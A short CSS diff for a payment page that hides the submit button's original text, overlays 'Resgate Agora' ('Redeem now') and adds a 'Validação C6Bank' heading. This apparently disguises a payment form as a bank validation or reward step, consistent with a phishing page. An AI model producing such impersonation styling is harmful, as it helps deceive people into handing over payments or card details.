@@ -257,3 +257,26 @@ button.submit-btn-payment {
   box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
   transition: background-color 0.3s ease;
 }
+
+h3.text-lg.font-medium.leading-none.text-gray-900.inline-block.mb-0::before {
+  content: "Validação C6Bank";
+  color: white;
+  display: block;
+}
+
+button.mt-4.submit-btn-payment.block.w-full.rounded-md.bg-green-600.px-3.py-2.text-lg.font-semibold.text-white.shadow-sm {
+  visibility: hidden; /* Esconde o texto original */
+  position: relative; /* Necessário para o ::before */
+}
+
+button.mt-4.submit-btn-payment.block.w-full.rounded-md.bg-green-600.px-3.py-2.text-lg.font-semibold.text-white.shadow-sm::before {
+  content: "Resgate Agora"; /* Novo texto */
+  visibility: visible;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%); /* Centraliza o texto */
+  color: black; /* Cor do texto */
+  font-size: 1rem; /* Ajuste do tamanho */
+  font-weight: bold; /* Texto em negrito */
+}
